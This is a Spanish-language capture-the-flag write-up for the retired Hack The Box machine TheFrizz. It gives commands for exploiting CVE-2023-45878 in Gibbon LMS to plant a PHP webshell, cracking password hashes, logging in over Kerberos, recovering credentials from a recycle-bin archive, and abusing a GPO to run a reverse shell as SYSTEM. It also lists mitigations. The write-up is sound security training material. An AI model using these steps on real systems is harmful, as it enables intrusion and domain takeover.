---
machine: TheFrizz
os: Windows
difficulty: Medium
platform: Hack The Box
state: Retired
tags: [windows, active-directory, gibbon, cve-2023-45878, kerberos, gpo]
---

# TheFrizz — Hack The Box (Windows)

[🌐 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de referencia; sin flags ni credenciales reales.

## TL;DR

Gibbon LMS 25.0.00 es vulnerable a CVE-2023-45878, una escritura arbitraria de archivos que deja un webshell PHP. La configuración filtra credenciales MySQL y la tabla de usuarios contiene hashes SHA-256 con sal. Tras entrar por Kerberos, un archivo borrado en la papelera revela la contraseña de otro usuario; `Group Policy Creator Owners` permite crear una GPO con una tarea inmediata como SYSTEM.

## Reconocimiento

```bash
nmap -Pn -sC -sV -p22,53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389 <IP>
```

- Windows DC con DNS, Kerberos, LDAP, SMB y WinRM.
- XAMPP/Apache en 80 con Gibbon LMS.
- El dominio es `frizz.htb` y el DC `frizzdc.frizz.htb`.

## Enumeración

- La raíz redirige a `frizzdc.frizz.htb`.
- El pie de Gibbon muestra la versión 25.0.00.
- El endpoint `modules/Rubrics/rubrics_visualise_saveAjax.php` acepta `img` y `path` sin autenticación.

## Foothold

El parámetro `img` se decodifica desde base64 y se escribe en la ruta indicada por `path`. Se coloca un webshell PHP en la raíz web.

```bash
curl -s 'http://frizzdc.frizz.htb/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php' \
  --data-urlencode 'img=data:image/png;base64,<BASE64_PHP>' \
  --data-urlencode 'path=shell.php'
```

El webshell se ejecuta como `frizz\w.webservice`. `config.php` contiene las credenciales de MySQL; la tabla `gibbonperson` guarda `sha256(salt . password)`, crackeable con `hashcat -m 1420`.

## Movimiento lateral

La contraseña de `f.frizzle` se obtiene del hash. El DC rechaza autenticación SSH por contraseña, así que se solicita un TGT y se usa GSSAPI.

```bash
kinit f.frizzle@FRIZZ.HTB
ssh -K -o GSSAPIAuthentication=yes f.frizzle@frizzdc.frizz.htb
```

En la papelera del perfil hay un archivo `.7z` renombrado. Dentro, `wapt/conf/waptserver.ini` contiene una contraseña en base64 para `m.schoolbus`.

```powershell
Copy-Item -LiteralPath 'C:\$Recycle.bin\<SID>\$RE2XMEG.7z' -Destination C:\Users\f.frizzle\Desktop\wapt.7z
```

## Escalada de privilegios

`m.schoolbus` pertenece a `Group Policy Creator Owners`. Con `SharpGPOAbuse` se crea una GPO con una tarea inmediata que ejecuta una reverse shell como SYSTEM al aplicarse en el OU de Domain Controllers.

```powershell
New-GPO -Name "ex$(Get-Date -UFormat %s)"
New-GPLink -Name $gname -Target "OU=Domain Controllers,DC=frizz,DC=htb"
.\SharpGPOAbuse.exe --addcomputertask --gponame $gname --command powershell.exe --arguments " -EncodedCommand <B64>"
gpupdate /force
```

## Evidencia

- Webshell y `whoami` como `w.webservice`.
- Hash crackeado y TGT de `f.frizzle`.
- Archivo de la papelera y contraseña de `m.schoolbus`, redactada.
- GPO, tarea y callback como SYSTEM.
- Flag redactada.

## Lecciones aprendidas

- Los archivos borrados pueden seguir en la papelera durante mucho tiempo.
- La autenticación Kerberos-only no impide el acceso si se obtiene un TGT.
- `Group Policy Creator Owners` es un privilegio de escalada, no solo de administración.

## Mitigaciones y detección

- Actualizar Gibbon a 25.1.0 o posterior y autenticar el endpoint de rúbricas.
- No reutilizar contraseñas de aplicación en cuentas de dominio.
- Vaciar papeleras y auditar credenciales en archivos de configuración.
- Monitorizar creación de GPO, tareas inmediatas y `gpupdate` en DCs.

## Referencias

- <https://www.hackthebox.com/machines/TheFrizz>
- <https://github.com/GibbonEdu/core/security/advisories/GHSA-95w7-c498-4xv8>
- <https://nvd.nist.gov/vuln/detail/CVE-2023-45878>
- <https://attack.mitre.org/techniques/T1484/001/>
